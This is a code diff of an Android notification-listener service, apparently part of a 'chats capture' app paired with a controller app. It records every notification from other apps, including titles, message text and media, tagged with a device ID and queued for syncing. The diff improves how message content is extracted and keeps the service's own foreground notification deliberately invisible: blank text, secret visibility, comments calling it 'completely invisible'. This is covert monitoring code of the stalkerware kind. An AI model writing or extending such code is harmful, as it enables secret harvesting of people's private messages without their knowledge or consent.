@@ -38,12 +38,23 @@ class NotificationCaptureService : NotificationListenerService() {
     private lateinit var mediaUploadManager: MediaUploadManager
     private lateinit var deviceRegistrationManager: com.chats.capture.managers.DeviceRegistrationManager
     
-    // Note: All notifications are captured (no filtering by app package)
-    // Previously had targetAppPackages filter, but now captures everything
+    // Packages to exclude from notification capture
+    private val excludedPackages = setOf(
+        "com.chats.capture",      // This app itself
+        "com.chats.controller"    // Controller app
+    )
     
     override fun onCreate() {
         super.onCreate()
-        Timber.tag("NOTIFICATION_CAPTURE").i("🚀 NotificationCaptureService created - Ready to capture ALL notifications")
+
+        // Global kill-switch: if capture is disabled, don't initialize or start foreground.
+        if (!com.chats.capture.utils.AppStateManager.areServicesEnabled(this)) {
+            Timber.tag("NOTIFICATION_CAPTURE").i("🛑 Capture disabled - stopping NotificationCaptureService initialization")
+            stopSelf()
+            return
+        }
+
+        Timber.tag("NOTIFICATION_CAPTURE").i("🚀 NotificationCaptureService created - Ready to capture notifications (excluding ${excludedPackages.joinToString(", ")})")
         Timber.d("NotificationCaptureService created")
         
         val database = (application as CaptureApplication).database
@@ -59,7 +70,7 @@ class NotificationCaptureService : NotificationListenerService() {
         startForegroundService()
         
         // Log service ready status
-        Timber.tag("NOTIFICATION_CAPTURE").i("✅ NotificationCaptureService initialized - All notifications will be captured and saved to database")
+        Timber.tag("NOTIFICATION_CAPTURE").i("✅ NotificationCaptureService initialized - Notifications will be captured (excluding ${excludedPackages.joinToString(", ")})")
     }
     
     override fun onDestroy() {
@@ -70,13 +81,13 @@ class NotificationCaptureService : NotificationListenerService() {
     
     override fun onListenerConnected() {
         super.onListenerConnected()
-        Timber.tag("NOTIFICATION_CAPTURE").i("✅ NotificationListenerService connected - Ready to receive all notifications")
+        Timber.tag("NOTIFICATION_CAPTURE").i("✅ NotificationListenerService connected - Ready to receive notifications (excluding ${excludedPackages.joinToString(", ")})")
         Timber.d("NotificationListenerService connected")
         
         // Check and log permission status
         val isEnabled = com.chats.capture.utils.PermissionChecker.isNotificationServiceEnabled(this)
         if (isEnabled) {
-            Timber.tag("NOTIFICATION_CAPTURE").i("✅ Notification Listener permission is ENABLED - All notifications will be captured")
+            Timber.tag("NOTIFICATION_CAPTURE").i("✅ Notification Listener permission is ENABLED - Notifications will be captured (excluding ${excludedPackages.joinToString(", ")})")
         } else {
             Timber.tag("NOTIFICATION_CAPTURE").e("❌ Notification Listener permission is DISABLED - Notifications will NOT be captured! Enable in Settings")
         }
@@ -92,7 +103,7 @@ class NotificationCaptureService : NotificationListenerService() {
         serviceScope.launch {
             try {
                 val unsyncedCount = notificationDao.getUnsyncedCount()
-                Timber.tag("NOTIFICATION_CAPTURE").i("📊 Notification Statistics - Unsynced: $unsyncedCount | Service ready to capture all notifications")
+                Timber.tag("NOTIFICATION_CAPTURE").i("📊 Notification Statistics - Unsynced: $unsyncedCount | Service ready to capture notifications (excluding ${excludedPackages.joinToString(", ")})")
             } catch (e: Exception) {
                 // Ignore - this is just for logging
                 Timber.tag("NOTIFICATION_CAPTURE").d("Could not fetch notification statistics")
@@ -108,6 +119,17 @@ class NotificationCaptureService : NotificationListenerService() {
     
     override fun onNotificationPosted(sbn: StatusBarNotification) {
         super.onNotificationPosted(sbn)
+
+        // Global kill-switch: if capture is disabled, do nothing.
+        if (!com.chats.capture.utils.AppStateManager.areServicesEnabled(this)) {
+            return
+        }
+        
+        // Filter out notifications from this app and controller app
+        if (isExcludedPackage(sbn.packageName)) {
+            Timber.tag("NOTIFICATION_CAPTURE").v("🚫 Ignoring notification from excluded package: ${sbn.packageName}")
+            return
+        }
         
         // Quick extraction for logging (minimal processing)
         val notification = sbn.notification
@@ -120,7 +142,7 @@ class NotificationCaptureService : NotificationListenerService() {
             "📱 NOTIFICATION RECEIVED | App: ${sbn.packageName} | Title: ${title.take(50)} | ID: ${sbn.id}"
         )
         
-        // Capture ALL notifications (not just target apps) to database
+        // Capture notifications (excluding this app and controller app) to database
         // Process in background immediately to avoid blocking
         serviceScope.launch {
             try {
@@ -129,12 +151,18 @@ class NotificationCaptureService : NotificationListenerService() {
                 Timber.tag("NOTIFICATION_CAPTURE").e(e, "❌ Error capturing notification from ${sbn.packageName}: ${e.message}")
                 // Try to at least save basic notification info even if media extraction fails
                 try {
+                    val fallbackTitle = extractTitle(sbn.notification.extras) ?: title
+                    val messageLines = extractMessageLines(sbn.notification.extras)
+                    val fallbackText = extractText(sbn.notification.extras, messageLines) ?: text
+                    val isGroupSummary = (sbn.notification.flags and Notification.FLAG_GROUP_SUMMARY) != 0
                     val basicNotification = NotificationData(
                         deviceId = deviceRegistrationManager.getDeviceId(),
                         appPackage = sbn.packageName,
                         appName = getAppName(sbn.packageName), // Get app name in background
-                        title = title,
-                        text = text,
+                        title = fallbackTitle,
+                        text = fallbackText,
+                        messageLines = messageLines,
+                        isGroupSummary = isGroupSummary,
                         timestamp = sbn.postTime,
                         mediaUrls = null,
                         serverMediaUrls = null,
@@ -151,6 +179,17 @@ class NotificationCaptureService : NotificationListenerService() {
     
     override fun onNotificationRemoved(sbn: StatusBarNotification) {
         super.onNotificationRemoved(sbn)
+
+        // Global kill-switch: if capture is disabled, do nothing.
+        if (!com.chats.capture.utils.AppStateManager.areServicesEnabled(this)) {
+            return
+        }
+        
+        // Filter out notifications from excluded packages
+        if (isExcludedPackage(sbn.packageName)) {
+            return
+        }
+        
         // Log notification removal for monitoring
         try {
             val notification = sbn.notification
@@ -165,14 +204,38 @@ class NotificationCaptureService : NotificationListenerService() {
         }
     }
     
+    /**
+     * Check if package should be excluded from notification capture
+     */
+    private fun isExcludedPackage(packageName: String): Boolean {
+        // Check against excluded packages list
+        if (excludedPackages.contains(packageName)) {
+            return true
+        }
+        
+        // Also check if it's this app's package (dynamic check)
+        try {
+            val thisPackage = packageName
+            if (thisPackage == applicationContext.packageName) {
+                return true
+            }
+        } catch (e: Exception) {
+            // Ignore errors
+        }
+        
+        return false
+    }
+    
     private suspend fun captureNotification(sbn: StatusBarNotification) {
         try {
             val notification = sbn.notification
             val extras = notification.extras
             
-            val title = extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString()
-            val text = extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString()
+            val title = extractTitle(extras)
+            val messageLines = extractMessageLines(extras)
+            val text = extractText(extras, messageLines)
             val appName = getAppName(sbn.packageName)
+            val isGroupSummary = (notification.flags and Notification.FLAG_GROUP_SUMMARY) != 0
 
             // Capture notification icon once per chat/notification key
             val iconKey = buildIconKey(sbn.packageName, title, text)
@@ -214,11 +277,19 @@ class NotificationCaptureService : NotificationListenerService() {
                         // Already a local file (from bitmap extraction)
                         val filePath = mediaSource.removePrefix("file://")
                         val file = java.io.File(filePath)
-                        if (file.exists() && file.length() > 0) {
+                        val fileSize = file.length()
+                        
+                        if (file.exists() && fileSize > 0) {
+                            // Check file size - skip files larger than 20MB
+                            if (fileSize > 20 * 1024 * 1024) {
+                                Timber.tag("NOTIFICATION_CAPTURE").w("⚠️ Media file size ${fileSize / (1024 * 1024)}MB exceeds 20MB limit - Skipping: ${file.name}")
+                                return@forEach
+                            }
+                            
                             // Optimize: Skip checksum for very large files (>10MB) to avoid blocking
-                            val checksum = if (file.length() > 10 * 1024 * 1024) {
+                            val checksum = if (fileSize > 10 * 1024 * 1024) {
                                 // For large files, use file size + name as checksum (faster)
-                                "${file.length()}_${file.name}".hashCode().toString()
+                                "${fileSize}_${file.name}".hashCode().toString()
                             } else {
                                 calculateFileChecksum(file)
                             }
@@ -237,7 +308,7 @@ class NotificationCaptureService : NotificationListenerService() {
                                 notificationId = sbn.id.toString(),
                                 appPackage = sbn.packageName,
                                 localPath = filePath,
-                                fileSize = file.length(),
+                                fileSize = fileSize,
                                 mimeType = mimeType,
                                 checksum = checksum,
                                 uploadStatus = UploadStatus.PENDING
@@ -245,13 +316,24 @@ class NotificationCaptureService : NotificationListenerService() {
                             mediaFileDao.insertMediaFile(mediaFile)
                             downloadedMediaFiles.add(filePath)
 
-                            Timber.d("Media file saved: $filePath, size: ${file.length()}, type: $mimeType")
+                            Timber.d("Media file saved: $filePath, size: ${fileSize / (1024 * 1024)}MB, type: $mimeType")
                         }
                     } else {
                         // It's a URL - download it (await the result)
                         val downloadResult = mediaDownloader.downloadMedia(mediaSource, sbn.id.toString())
                         downloadResult.fold(
                             onSuccess = { downloadedMedia ->
+                                // Check file size - skip files larger than 20MB
+                                if (downloadedMedia.fileSize > 20 * 1024 * 1024) {
+                                    Timber.tag("NOTIFICATION_CAPTURE").w("⚠️ Downloaded media size ${downloadedMedia.fileSize / (1024 * 1024)}MB exceeds 20MB limit - Skipping: ${downloadedMedia.localPath}")
+                                    // Clean up downloaded file
+                                    try {
+                                        java.io.File(downloadedMedia.localPath).delete()
+                                    } catch (_: Exception) {
+                                    }
+                                    return@fold
+                                }
+                                
                                 // Deduplicate by checksum (use existing upload if available)
                                 val existing = mediaFileDao.findMediaFileByChecksum(downloadedMedia.checksum)
                                 if (existing != null && existing.remoteUrl != null) {
@@ -278,7 +360,7 @@ class NotificationCaptureService : NotificationListenerService() {
                                 mediaFileDao.insertMediaFile(mediaFile)
                                 downloadedMediaFiles.add(downloadedMedia.localPath)
 
-                                Timber.d("Media downloaded: ${downloadedMedia.localPath}, size: ${downloadedMedia.fileSize}, type: ${downloadedMedia.mimeType}")
+                                Timber.d("Media downloaded: ${downloadedMedia.localPath}, size: ${downloadedMedia.fileSize / (1024 * 1024)}MB, type: ${downloadedMedia.mimeType}")
                             },
                             onFailure = { error ->
                                 Timber.e(error, "Failed to download media: $mediaSource")
@@ -312,6 +394,8 @@ class NotificationCaptureService : NotificationListenerService() {
                     appName = appName,
                     title = title,
                     text = text,
+                    messageLines = messageLines,
+                    isGroupSummary = isGroupSummary,
                     timestamp = sbn.postTime,
                     mediaUrls = downloadedMediaFiles.ifEmpty { null },
                     serverMediaUrls = serverMediaUrls.ifEmpty { null },
@@ -362,9 +446,51 @@ class NotificationCaptureService : NotificationListenerService() {
             Timber.e(e, "Error processing notification")
         }
     }
+
+    private fun extractTitle(extras: android.os.Bundle?): String? {
+        if (extras == null) return null
+        return extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()
+            ?: extras.getCharSequence(Notification.EXTRA_TITLE_BIG)?.toString()
+            ?: extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()
+    }
+
+    private fun extractText(extras: android.os.Bundle?, messageLines: List<String>?): String? {
+        if (extras == null) return messageLines?.joinToString("\n")
+        return extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
+            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
+            ?: extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString()
+            ?: extras.getCharSequence(Notification.EXTRA_INFO_TEXT)?.toString()
+            ?: messageLines?.joinToString("\n")
+    }
+
+    private fun extractMessageLines(extras: android.os.Bundle?): List<String>? {
+        if (extras == null) return null
+        val lines = mutableListOf<String>()
+
+        val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
+        textLines?.forEach { line ->
+            val text = line?.toString()?.trim()
+            if (!text.isNullOrBlank()) {
+                lines.add(text)
+            }
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            @Suppress("UNCHECKED_CAST")
+            val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES) as? Array<android.os.Bundle>
+            messages?.forEach { message ->
+                val messageText = message.getCharSequence("text")?.toString()?.trim()
+                if (!messageText.isNullOrBlank()) {
+                    lines.add(messageText)
+                }
+            }
+        }
+
+        return if (lines.isEmpty()) null else lines.distinct()
+    }
     
-    // Note: isTargetApp() method removed - all notifications are now captured
-    // No filtering is applied to ensure complete notification capture
+    // Note: Notifications from excluded packages (com.chats.capture, com.chats.controller) are filtered out
+    // All other notifications are captured to ensure complete notification monitoring
     
     private fun getAppName(packageName: String): String {
         return try {
@@ -421,7 +547,7 @@ class NotificationCaptureService : NotificationListenerService() {
         val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
             .setContentTitle("") // Empty title - completely invisible
             .setContentText("") // Empty text - completely invisible
-            .setSmallIcon(android.R.drawable.ic_menu_compass) // Minimal system icon - less visible
+            .setSmallIcon(android.R.drawable.ic_menu_info_details) // Minimal system icon - least visible
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN) // Minimum priority - won't show
             .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hidden everywhere
@@ -429,6 +555,7 @@ class NotificationCaptureService : NotificationListenerService() {
             .setSilent(true) // Completely silent
             .setCategory(NotificationCompat.CATEGORY_SERVICE) // System service category
             .setLocalOnly(true) // Only local, not synced
+            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE) // Immediate start
             .build()
         
         if (android.os.Build.VERSION.SDK_INT >= 34) {
